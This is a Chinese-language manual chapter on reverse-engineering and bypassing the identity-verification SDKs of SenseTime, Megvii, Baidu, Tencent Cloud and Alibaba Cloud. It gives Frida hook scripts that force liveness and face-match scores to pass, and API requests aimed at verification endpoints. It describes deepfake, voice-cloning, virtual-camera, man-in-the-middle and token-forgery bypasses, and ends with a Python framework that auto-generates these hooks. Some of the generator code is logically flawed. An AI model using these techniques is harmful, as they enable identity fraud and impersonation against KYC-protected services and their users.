## 14. 国内主流KYC SDK逆向分析

### 14.1 商汤科技 SenseID / SenseKYC

```bash
# === 商汤 SenseID SDK 逆向 ===

# SDK特征:
# - 包名: com.sensetime.senseid.*
# - so库: libst_face_*.so, libsenseid_*.so
# - 活体检测: 动作活体 + 炫彩活体 + 静默活体

# 逆向步骤:
# 1. 提取SDK
jadx -d sensetime_output target_app.apk
# 搜索: com.sensetime

# 2. 分析关键类
# - SenseIDLivenessDetector: 活体检测核心
# - SenseIDFaceCompare: 人脸比对
# - SenseIDResult: 检测结果回调

# 3. Frida Hook关键函数
frida -U -l sensetime_hook.js -f com.target.app

# sensetime_hook.js:
Java.perform(function() {
    // Hook活体检测结果
    var LivenessDetector = Java.use("com.sensetime.senseid.SenseIDLivenessDetector");
    LivenessDetector.onLivenessSuccess.implementation = function(result) {
        console.log("[*] SenseID Liveness SUCCESS: " + result);
        // 强制返回高分
        this.onLivenessSuccess(0.99);
    };
    
    // Hook人脸比对结果
    var FaceCompare = Java.use("com.sensetime.senseid.SenseIDFaceCompare");
    FaceCompare.onCompareResult.implementation = function(score) {
        console.log("[*] Face compare score: " + score);
        // 篡改分数
        this.onCompareResult(0.99);
    };
});

# 4. 攻击面
# - 端侧活体检测: 可Hook绕过
# - 云端检测: 需要拦截API请求
# - 炫彩活体: 需要使用物理屏幕模拟光线变化
```

### 14.2 旷视 FaceID / MegLive

```bash
# === 旷视 FaceID SDK 逆向 ===

# SDK特征:
# - 包名: com.megvii.*, com.faceid.*
# - so库: libmegface*.so, libmeglive*.so
# - 活体检测: 动作活体 + 红外活体 + 3D结构光

# 关键类分析:
# - MegLiveDetector: 活体检测引擎
# - MegFaceID: 人脸比对
# - MegLiveResult: 活体检测结果

# Frida Hook:
Java.perform(function() {
    var MegLiveDetector = Java.use("com.megvii.meglive.MegLiveDetector");
    
    // Hook活体检测成功回调
    MegLiveDetector.onDetectSuccess.implementation = function(result) {
        console.log("[*] MegLive Detection SUCCESS");
        // 修改liveness_score
        result.setLivenessScore(1.0);
        this.onDetectSuccess(result);
    };
    
    // Hook人脸比对
    var MegFaceID = Java.use("com.megvii.faceid.MegFaceID");
    MegFaceID.compareFaces.implementation = function(face1, face2) {
        console.log("[*] Face compare called — returning 99.9% match");
        return 0.999;
    };
});

# 旷视端云协同架构:
# 端侧: 初级拦截90%低质量攻击
# 云端: 大模型深度分析(光流/纹理/生理信号)
# 绕过策略: 同时攻击端侧和云端，或找到纯端侧验证的降级路径
```

### 14.3 百度 AI 人脸识别

```bash
# === 百度AI人脸识别SDK逆向 ===

# SDK特征:
# - API: aip.baidubce.com
# - SDK: com.baidu.aip.face.*
# - 活体检测: 动作活体 + 视频活体 + H5活体

# 攻击面:
# 1. API层攻击
# 百度AI人脸识别使用REST API
# 抓包分析API调用:
curl -X POST "https://aip.baidubce.com/rest/2.0/face/v3/faceset/user/add" \
  -H "Content-Type: application/json" \
  -d '{"image":"base64_image","image_type":"BASE64","group_id":"test","user_id":"user1"}'

# 2. 活体检测API绕过
# 百度活体检测API: /rest/2.0/face/v3/faceverify
# 如果后端不验证活体检测分数:
curl -X POST "https://aip.baidubce.com/rest/2.0/face/v3/faceverify" \
  -d '{"image":"base64_fake_image","image_type":"BASE64","face_field":"age,beauty"}'

# 3. H5活体检测绕过
# 百度H5活体检测使用WebRTC
# 攻击: 虚拟摄像头 + 修改WebRTC采集源
# 或者: 拦截WebRTC信令 → 替换视频流

# 4. 视频活体检测绕过
# 百度视频活体要求用户朗读随机数字
# 攻击: 预录所有数字读音 + 语音克隆
```

### 14.4 腾讯云 人脸核身

```bash
# === 腾讯云人脸核身逆向 ===

# SDK特征:
# - 包名: com.tencent.cloud.facerecognition
# - 服务: 腾讯云慧眼
# - 活体检测: 数字活体 + 光线活体 + 动作活体

# 关键API:
# - DetectAuth: 活体检测授权
# - GetDetectResult: 获取检测结果
# - GetDetectResultEnhanced: 增强版结果

# 攻击面:
# 1. 数字活体检测绕过
# 腾讯数字活体随机生成4位数字
# 原理: 验证用户是否朗读了屏幕上的数字
# 绕过: 
#   - 如果仅验证口型(TTS+唇形同步)
#   - 如果验证音频(语音克隆)
#   - 如果验证视频+音频(Deepfake+语音克隆)

# 2. 光线活体检测绕过
# 原理: 屏幕发出随机颜色光线，验证面部反射
# 绕过: 使用物理屏幕模拟光线 + 预录不同光线下的视频
# 难度: 较高，需要实时响应

# 3. 结果获取API攻击
# 如果GetDetectResult返回的验证分数可被篡改:
curl -X POST "https://faceid.tencentcloudapi.com/" \
  -d '{"Action":"GetDetectResult","BizToken":"xxx"}'
# 中间人攻击: 拦截响应 → 修改检测分数 → 返回给客户端
```

### 14.5 阿里云 实人认证

```bash
# === 阿里云实人认证逆向 ===

# SDK特征:
# - 包名: com.alibaba.security.*, com.alibaba.wireless.security.*
# - 服务: 阿里云实人认证/金融级实人认证
# - 活体检测: RPVerify(实人认证) + 多因子认证

# 关键点:
# 1. 阿里安全SDK(聚安全)加固
# 阿里云实人认证SDK使用了阿里自有的安全加固
# 逆向难度: 高
# 绕过: 使用Frida绕过加固检测

# 2. 活体检测流程
# RPVerify → 活体检测 → 人脸比对 → 返回认证Token
# 攻击: 拦截认证Token → 伪造成功响应

# 3. 设备指纹
# 阿里云实人认证会收集设备指纹
# 攻击: Hook设备指纹采集 → 返回正常设备信息

# 4. 风险控制
# 阿里云有强大的风控引擎
# 攻击: 需要模拟正常用户行为(鼠标轨迹、操作间隔等)
```

### 14.6 KYC SDK通用攻击框架

```python
# === KYC SDK通用Hook框架 ===

import frida
import json

class KYCSDKHijacker:
    """KYC SDK通用劫持框架"""
    
    KNOWN_SDK_PATTERNS = {
        "sensetime": {
            "packages": ["com.sensetime.senseid", "com.sensetime.face"],
            "classes": ["SenseIDLivenessDetector", "SenseIDResult"],
            "hooks": {
                "onLivenessSuccess": "return 0.99",
                "onCompareResult": "return 0.99"
            }
        },
        "megvii": {
            "packages": ["com.megvii.meglive", "com.faceid"],
            "classes": ["MegLiveDetector", "MegLiveResult"],
            "hooks": {
                "onDetectSuccess": "result.setLivenessScore(1.0)",
                "compareFaces": "return 0.999"
            }
        },
        "baidu": {
            "packages": ["com.baidu.aip.face"],
            "classes": ["FaceDetect", "FaceVerify"],
            "hooks": {
                "onResult": "result.setScore(100)",
                "verifyFace": "return true"
            }
        },
        "tencent": {
            "packages": ["com.tencent.cloud.facerecognition"],
            "classes": ["FaceVerify", "LivenessDetect"],
            "hooks": {
                "onSuccess": "return true",
                "getDetectResult": "return {'Score': 100}"
            }
        },
        "alibaba": {
            "packages": ["com.alibaba.security", "com.alibaba.wireless.security"],
            "classes": ["RPVerify", "FaceVerifyService"],
            "hooks": {
                "onVerifySuccess": "return auth_token",
                "getDeviceFingerprint": "return normal_device_info"
            }
        }
    }
    
    def detect_sdk(self, apk_path):
        """检测APP使用的KYC SDK"""
        # 反编译APK → 搜索特征包名 → 返回SDK类型
        pass
    
    def generate_hook_script(self, sdk_type):
        """根据检测到的SDK自动生成Hook脚本"""
        sdk_config = self.KNOWN_SDK_PATTERNS.get(sdk_type)
        if not sdk_config:
            return None
        
        # 生成Frida脚本
        js = "Java.perform(function() {\n"
        for class_name, hooks in sdk_config["hooks"].items():
            js += f"    var {class_name} = Java.use('{class_name}');\n"
            for method, return_value in hooks.items():
                js += f"    {class_name}.{method}.implementation = function() {{\n"
                js += f"        console.log('[*] Hooked {method}');\n"
                js += f"        return {return_value};\n"
                js += f"    }};\n"
        js += "});\n"
        return js
```

---

